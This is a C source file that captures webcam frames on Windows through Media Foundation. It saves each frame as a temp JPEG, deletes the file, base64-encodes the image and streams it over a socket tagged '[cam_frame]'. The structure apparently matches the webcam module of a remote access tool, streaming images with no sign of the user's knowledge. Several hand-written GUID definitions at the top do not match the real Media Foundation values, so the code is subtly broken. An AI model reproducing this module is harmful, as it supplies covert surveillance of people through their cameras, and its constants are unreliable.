#define INITGUID
#include "camera.h"
#include "stbi_image_write.h"
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <stdio.h>

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "ole32.lib")

// Define missing GUIDs if necessary
// {48356917-2271-452f-b274-98939029519d}
DEFINE_GUID(MF_MT_MAJOR_TYPE, 0x48356917, 0x2271, 0x452f, 0xb2, 0x74, 0x98, 0x93, 0x90, 0x29, 0x51, 0x9d);
// {73646976-0000-0010-8000-00aa00389b71}
DEFINE_GUID(MF_MT_VIDEO, 0x73646976, 0x0000, 0x0010, 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71);
// {172BDAD8-285B-4468-8545-25A03E090312}
DEFINE_GUID(MF_MT_SUBTYPE, 0x172bdad8, 0x285b, 0x4468, 0x85, 0x45, 0x25, 0xa0, 0x3e, 0x09, 0x03, 0x12);
// {73646962-0000-0010-8000-00aa00389b71}
DEFINE_GUID(MFVideoFormat_RGB24, 0x73646962, 0x0000, 0x0010, 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71);
// {1652c33d-d6b2-4a27-b839-772217965c0b}
DEFINE_GUID(MF_MT_FRAME_SIZE, 0x1652c33d, 0xd6b2, 0x4a27, 0xb8, 0x39, 0x77, 0x22, 0x17, 0x96, 0x5c, 0x0b);
// {c45972d9-3074-4b40-b4d4-08bc36a0bc72}
DEFINE_GUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, 0xc45972d9, 0x3074, 0x4b40, 0xb4, 0xd4, 0x08, 0xbc, 0x36, 0xa0, 0xbc, 0x72);
// {90570161-5819-498b-80bd-970234603c15}
DEFINE_GUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID, 0x90570161, 0x5819, 0x498b, 0x80, 0xbd, 0x97, 0x02, 0x34, 0x60, 0x3c, 0x15);

// Helper to replace MFGetAttributeSize if not available in some environments
static HRESULT get_mf_frame_size(IMFMediaType* pType, UINT32* pW, UINT32* pH) {
    UINT64 size;
    HRESULT hr = pType->lpVtbl->GetUINT64(pType, &MF_MT_FRAME_SIZE, &size);
    if (SUCCEEDED(hr)) {
        *pW = (UINT32)(size >> 32);
        *pH = (UINT32)size;
    }
    return hr;
}

void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
    int interval = 1000 / (fps > 0 ? fps : 1);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);

    IMFAttributes* pConfig = NULL;
    MFCreateAttributes(&pConfig, 1);
    pConfig->lpVtbl->SetGUID(pConfig, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;
    MFEnumDeviceSources(pConfig, &ppDevices, &count);

    if (count == 0) {
        if (pConfig) pConfig->lpVtbl->Release(pConfig);
        MFShutdown();
        CoUninitialize();
        return;
    }

    IMFMediaSource* pSource = NULL;
    ppDevices[0]->lpVtbl->ActivateObject(ppDevices[0], &IID_IMFMediaSource, (void**)&pSource);

    IMFSourceReader* pReader = NULL;
    MFCreateSourceReaderFromMediaSource(pSource, NULL, &pReader);

    // Select RGB24 output
    IMFMediaType* pType = NULL;
    MFCreateMediaType(&pType);
    pType->lpVtbl->SetGUID(pType, &MF_MT_MAJOR_TYPE, &MF_MT_VIDEO);
    pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE, &MFVideoFormat_RGB24);
    pReader->lpVtbl->SetCurrentMediaType(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
    pType->lpVtbl->Release(pType);

    while (WaitForSingleObject(stop_event, interval) == WAIT_TIMEOUT) {
        DWORD streamIndex, flags;
        LONGLONG timestamp;
        IMFSample* pSample = NULL;
        pReader->lpVtbl->ReadSample(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &timestamp, &pSample);

        if (pSample) {
            IMFMediaBuffer* pBuffer = NULL;
            pSample->lpVtbl->GetBufferByIndex(pSample, 0, &pBuffer);
            BYTE* pData = NULL;
            DWORD cbData = 0;
            pBuffer->lpVtbl->Lock(pBuffer, &pData, NULL, &cbData);

            // Get width/height
            IMFMediaType* pCurType = NULL;
            pReader->lpVtbl->GetCurrentMediaType(pReader, (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurType);
            UINT32 w, h;
            get_mf_frame_size(pCurType, &w, &h);
            pCurType->lpVtbl->Release(pCurType);

            char tmp[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            strcat(tmp, "cam.jpg");
            stbi_write_jpg(tmp, w, h, 3, pData, 60);

            pBuffer->lpVtbl->Unlock(pBuffer);
            pBuffer->lpVtbl->Release(pBuffer);
            pSample->lpVtbl->Release(pSample);

            FILE* f = fopen(tmp, "rb");
            if (f) {
                fseek(f, 0, SEEK_END);
                long size = ftell(f);
                fseek(f, 0, SEEK_SET);
                unsigned char* jpg_data = malloc(size);
                fread(jpg_data, 1, size, f);
                fclose(f);
                DeleteFileA(tmp);

                size_t b64_len;
                char* b64 = base64_encode(jpg_data, size, &b64_len);
                free(jpg_data);

                char* msg = malloc(b64_len + 32);
                sprintf(msg, "[cam_frame]%s", b64);
                sock_send(sock, mutex, msg);
                free(msg); free(b64);
            }
        }
    }

    pReader->lpVtbl->Release(pReader);
    pSource->lpVtbl->Release(pSource);
    for (UINT32 i = 0; i < count; i++) ppDevices[i]->lpVtbl->Release(ppDevices[i]);
    CoTaskMemFree(ppDevices);
    if (pConfig) pConfig->lpVtbl->Release(pConfig);
    MFShutdown();
    CoUninitialize();
}
